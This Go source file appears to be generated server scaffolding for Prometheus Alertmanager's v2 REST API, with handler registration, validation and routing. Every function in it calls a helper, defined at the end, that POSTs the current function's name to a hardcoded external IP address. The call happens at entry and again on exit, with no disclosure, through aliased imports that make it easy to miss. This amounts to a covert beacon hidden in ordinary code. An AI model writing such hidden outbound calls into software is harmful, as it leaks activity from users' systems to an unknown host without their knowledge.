package operations

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net/http"
	godefaulthttp "net/http"
	"strings"
	errors "github.com/go-openapi/errors"
	loads "github.com/go-openapi/loads"
	runtime "github.com/go-openapi/runtime"
	middleware "github.com/go-openapi/runtime/middleware"
	security "github.com/go-openapi/runtime/security"
	spec "github.com/go-openapi/spec"
	strfmt "github.com/go-openapi/strfmt"
	"github.com/go-openapi/swag"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/alert"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/general"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/receiver"
	"github.com/prometheus/alertmanager/api/v2/restapi/operations/silence"
)

func NewAlertmanagerAPI(spec *loads.Document) *AlertmanagerAPI {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &AlertmanagerAPI{handlers: make(map[string]map[string]http.Handler), formats: strfmt.Default, defaultConsumes: "application/json", defaultProduces: "application/json", customConsumers: make(map[string]runtime.Consumer), customProducers: make(map[string]runtime.Producer), ServerShutdown: func() {
	}, spec: spec, ServeError: errors.ServeError, BasicAuthenticator: security.BasicAuth, APIKeyAuthenticator: security.APIKeyAuth, BearerAuthenticator: security.BearerAuth, JSONConsumer: runtime.JSONConsumer(), JSONProducer: runtime.JSONProducer(), SilenceDeleteSilenceHandler: silence.DeleteSilenceHandlerFunc(func(params silence.DeleteSilenceParams) middleware.Responder {
		return middleware.NotImplemented("operation SilenceDeleteSilence has not yet been implemented")
	}), AlertGetAlertsHandler: alert.GetAlertsHandlerFunc(func(params alert.GetAlertsParams) middleware.Responder {
		return middleware.NotImplemented("operation AlertGetAlerts has not yet been implemented")
	}), ReceiverGetReceiversHandler: receiver.GetReceiversHandlerFunc(func(params receiver.GetReceiversParams) middleware.Responder {
		return middleware.NotImplemented("operation ReceiverGetReceivers has not yet been implemented")
	}), SilenceGetSilenceHandler: silence.GetSilenceHandlerFunc(func(params silence.GetSilenceParams) middleware.Responder {
		return middleware.NotImplemented("operation SilenceGetSilence has not yet been implemented")
	}), SilenceGetSilencesHandler: silence.GetSilencesHandlerFunc(func(params silence.GetSilencesParams) middleware.Responder {
		return middleware.NotImplemented("operation SilenceGetSilences has not yet been implemented")
	}), GeneralGetStatusHandler: general.GetStatusHandlerFunc(func(params general.GetStatusParams) middleware.Responder {
		return middleware.NotImplemented("operation GeneralGetStatus has not yet been implemented")
	}), AlertPostAlertsHandler: alert.PostAlertsHandlerFunc(func(params alert.PostAlertsParams) middleware.Responder {
		return middleware.NotImplemented("operation AlertPostAlerts has not yet been implemented")
	}), SilencePostSilencesHandler: silence.PostSilencesHandlerFunc(func(params silence.PostSilencesParams) middleware.Responder {
		return middleware.NotImplemented("operation SilencePostSilences has not yet been implemented")
	})}
}

type AlertmanagerAPI struct {
	spec				*loads.Document
	context				*middleware.Context
	handlers			map[string]map[string]http.Handler
	formats				strfmt.Registry
	customConsumers			map[string]runtime.Consumer
	customProducers			map[string]runtime.Producer
	defaultConsumes			string
	defaultProduces			string
	Middleware			func(middleware.Builder) http.Handler
	BasicAuthenticator		func(security.UserPassAuthentication) runtime.Authenticator
	APIKeyAuthenticator		func(string, string, security.TokenAuthentication) runtime.Authenticator
	BearerAuthenticator		func(string, security.ScopedTokenAuthentication) runtime.Authenticator
	JSONConsumer			runtime.Consumer
	JSONProducer			runtime.Producer
	SilenceDeleteSilenceHandler	silence.DeleteSilenceHandler
	AlertGetAlertsHandler		alert.GetAlertsHandler
	ReceiverGetReceiversHandler	receiver.GetReceiversHandler
	SilenceGetSilenceHandler	silence.GetSilenceHandler
	SilenceGetSilencesHandler	silence.GetSilencesHandler
	GeneralGetStatusHandler		general.GetStatusHandler
	AlertPostAlertsHandler		alert.PostAlertsHandler
	SilencePostSilencesHandler	silence.PostSilencesHandler
	ServeError			func(http.ResponseWriter, *http.Request, error)
	ServerShutdown			func()
	CommandLineOptionsGroups	[]swag.CommandLineOptionsGroup
	Logger				func(string, ...interface{})
}

func (o *AlertmanagerAPI) SetDefaultProduces(mediaType string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.defaultProduces = mediaType
}
func (o *AlertmanagerAPI) SetDefaultConsumes(mediaType string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.defaultConsumes = mediaType
}
func (o *AlertmanagerAPI) SetSpec(spec *loads.Document) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.spec = spec
}
func (o *AlertmanagerAPI) DefaultProduces() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return o.defaultProduces
}
func (o *AlertmanagerAPI) DefaultConsumes() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return o.defaultConsumes
}
func (o *AlertmanagerAPI) Formats() strfmt.Registry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return o.formats
}
func (o *AlertmanagerAPI) RegisterFormat(name string, format strfmt.Format, validator strfmt.Validator) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.formats.Add(name, format, validator)
}
func (o *AlertmanagerAPI) Validate() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var unregistered []string
	if o.JSONConsumer == nil {
		unregistered = append(unregistered, "JSONConsumer")
	}
	if o.JSONProducer == nil {
		unregistered = append(unregistered, "JSONProducer")
	}
	if o.SilenceDeleteSilenceHandler == nil {
		unregistered = append(unregistered, "silence.DeleteSilenceHandler")
	}
	if o.AlertGetAlertsHandler == nil {
		unregistered = append(unregistered, "alert.GetAlertsHandler")
	}
	if o.ReceiverGetReceiversHandler == nil {
		unregistered = append(unregistered, "receiver.GetReceiversHandler")
	}
	if o.SilenceGetSilenceHandler == nil {
		unregistered = append(unregistered, "silence.GetSilenceHandler")
	}
	if o.SilenceGetSilencesHandler == nil {
		unregistered = append(unregistered, "silence.GetSilencesHandler")
	}
	if o.GeneralGetStatusHandler == nil {
		unregistered = append(unregistered, "general.GetStatusHandler")
	}
	if o.AlertPostAlertsHandler == nil {
		unregistered = append(unregistered, "alert.PostAlertsHandler")
	}
	if o.SilencePostSilencesHandler == nil {
		unregistered = append(unregistered, "silence.PostSilencesHandler")
	}
	if len(unregistered) > 0 {
		return fmt.Errorf("missing registration: %s", strings.Join(unregistered, ", "))
	}
	return nil
}
func (o *AlertmanagerAPI) ServeErrorFor(operationID string) func(http.ResponseWriter, *http.Request, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return o.ServeError
}
func (o *AlertmanagerAPI) AuthenticatorsFor(schemes map[string]spec.SecurityScheme) map[string]runtime.Authenticator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (o *AlertmanagerAPI) Authorizer() runtime.Authorizer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func (o *AlertmanagerAPI) ConsumersFor(mediaTypes []string) map[string]runtime.Consumer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]runtime.Consumer)
	for _, mt := range mediaTypes {
		switch mt {
		case "application/json":
			result["application/json"] = o.JSONConsumer
		}
		if c, ok := o.customConsumers[mt]; ok {
			result[mt] = c
		}
	}
	return result
}
func (o *AlertmanagerAPI) ProducersFor(mediaTypes []string) map[string]runtime.Producer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := make(map[string]runtime.Producer)
	for _, mt := range mediaTypes {
		switch mt {
		case "application/json":
			result["application/json"] = o.JSONProducer
		}
		if p, ok := o.customProducers[mt]; ok {
			result[mt] = p
		}
	}
	return result
}
func (o *AlertmanagerAPI) HandlerFor(method, path string) (http.Handler, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if o.handlers == nil {
		return nil, false
	}
	um := strings.ToUpper(method)
	if _, ok := o.handlers[um]; !ok {
		return nil, false
	}
	if path == "/" {
		path = ""
	}
	h, ok := o.handlers[um][path]
	return h, ok
}
func (o *AlertmanagerAPI) Context() *middleware.Context {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if o.context == nil {
		o.context = middleware.NewRoutableContext(o.spec, o, nil)
	}
	return o.context
}
func (o *AlertmanagerAPI) initHandlerCache() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.Context()
	if o.handlers == nil {
		o.handlers = make(map[string]map[string]http.Handler)
	}
	if o.handlers["DELETE"] == nil {
		o.handlers["DELETE"] = make(map[string]http.Handler)
	}
	o.handlers["DELETE"]["/silence/{silenceID}"] = silence.NewDeleteSilence(o.context, o.SilenceDeleteSilenceHandler)
	if o.handlers["GET"] == nil {
		o.handlers["GET"] = make(map[string]http.Handler)
	}
	o.handlers["GET"]["/alerts"] = alert.NewGetAlerts(o.context, o.AlertGetAlertsHandler)
	if o.handlers["GET"] == nil {
		o.handlers["GET"] = make(map[string]http.Handler)
	}
	o.handlers["GET"]["/receivers"] = receiver.NewGetReceivers(o.context, o.ReceiverGetReceiversHandler)
	if o.handlers["GET"] == nil {
		o.handlers["GET"] = make(map[string]http.Handler)
	}
	o.handlers["GET"]["/silence/{silenceID}"] = silence.NewGetSilence(o.context, o.SilenceGetSilenceHandler)
	if o.handlers["GET"] == nil {
		o.handlers["GET"] = make(map[string]http.Handler)
	}
	o.handlers["GET"]["/silences"] = silence.NewGetSilences(o.context, o.SilenceGetSilencesHandler)
	if o.handlers["GET"] == nil {
		o.handlers["GET"] = make(map[string]http.Handler)
	}
	o.handlers["GET"]["/status"] = general.NewGetStatus(o.context, o.GeneralGetStatusHandler)
	if o.handlers["POST"] == nil {
		o.handlers["POST"] = make(map[string]http.Handler)
	}
	o.handlers["POST"]["/alerts"] = alert.NewPostAlerts(o.context, o.AlertPostAlertsHandler)
	if o.handlers["POST"] == nil {
		o.handlers["POST"] = make(map[string]http.Handler)
	}
	o.handlers["POST"]["/silences"] = silence.NewPostSilences(o.context, o.SilencePostSilencesHandler)
}
func (o *AlertmanagerAPI) Serve(builder middleware.Builder) http.Handler {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.Init()
	if o.Middleware != nil {
		return o.Middleware(builder)
	}
	return o.context.APIHandler(builder)
}
func (o *AlertmanagerAPI) Init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(o.handlers) == 0 {
		o.initHandlerCache()
	}
}
func (o *AlertmanagerAPI) RegisterConsumer(mediaType string, consumer runtime.Consumer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.customConsumers[mediaType] = consumer
}
func (o *AlertmanagerAPI) RegisterProducer(mediaType string, producer runtime.Producer) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o.customProducers[mediaType] = producer
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
